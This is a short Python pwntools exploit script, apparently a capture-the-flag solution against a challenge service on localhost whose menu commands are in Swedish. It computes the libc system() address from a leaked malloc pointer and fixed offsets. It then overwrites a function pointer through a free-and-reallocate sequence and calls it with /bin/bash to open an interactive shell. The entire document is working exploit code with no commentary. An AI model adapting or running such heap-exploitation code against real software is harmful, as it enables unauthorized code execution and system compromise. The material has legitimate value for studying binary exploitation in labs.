import pwn

system_offset = 0x055410
malloc_offset = 0x09d260
diff = system_offset - malloc_offset

#p = pwn.process("./a.out")
p = pwn.remote("localhost", 40113)

line = p.readline().decode("utf-8").strip().split(": ")[1]
malloc_location = eval(line)
system_location = malloc_location+diff
print(hex(system_location))

p.sendline(b"fixahemlis")
p.sendline(b"A"*8+pwn.p64(system_location)+b"CCCC")
p.sendline(b"befria")
p.sendline(b"allokera")
p.sendline(b"24")
p.sendline(b"fixahemlis")
p.sendline(b"/bin/bash")
p.sendline(b"anropa")

p.interactive()

